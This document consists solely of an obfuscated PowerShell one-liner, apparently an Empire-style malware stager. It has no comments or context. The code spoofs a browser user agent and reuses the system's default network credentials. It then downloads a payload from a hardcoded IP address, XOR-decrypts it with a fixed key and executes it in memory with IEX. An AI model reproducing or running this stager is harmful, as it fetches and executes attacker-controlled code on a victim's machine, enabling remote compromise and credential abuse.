
[SystEm.NET.SeRvIcEPoInTMaNAGeR]::EXPEct100CoNTINue = 0;$wc=New-ObjeCt SYsTEM.NEt.WEbClIEnt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HeAdERS.AdD('User-Agent',$u);$Wc.PrOxY = [SyStem.NET.WEBREQUEST]::DeFauLTWebPRoXY;$wc.PRoxY.CreDentiALs = [SYsTEm.NET.CRedENTiaLCacHe]::DeFAUltNeTWORkCReDENtiALs;$K='63a9f0ea7bb98050796b649e85481845';$I=0;[chAR[]]$b=([ChAR[]]($Wc.DownloADSTRinG("http://138.121.170.12:500/index.asp")))|%{$_-BXor$K[$i++%$K.Length]};IEX ($b-joIn'')

